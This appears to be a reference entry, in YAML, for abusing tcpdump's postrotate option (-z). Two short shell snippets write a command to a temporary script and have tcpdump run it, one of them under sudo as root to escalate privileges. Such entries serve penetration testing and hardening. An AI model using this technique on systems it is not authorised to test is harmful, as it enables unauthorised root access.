---
description: |
  These require some traffic to be actually captured. Also note that the subprocess is immediately sent to the background.

  In recent distributions (e.g., Debian 10 and Ubuntu 18) AppArmor limits the `postrotate-command` to a small subset of predefined commands thus preventing the execution of the following.
functions:
  command:
    - code: |
        COMMAND='id'
        TF=$(mktemp)
        echo "$COMMAND" > $TF
        chmod +x $TF
        tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF
  sudo:
    - code: |
        COMMAND='id'
        TF=$(mktemp)
        echo "$COMMAND" > $TF
        chmod +x $TF
        sudo tcpdump -ln -i lo -w /dev/null -W 1 -G 1 -z $TF -Z root
---
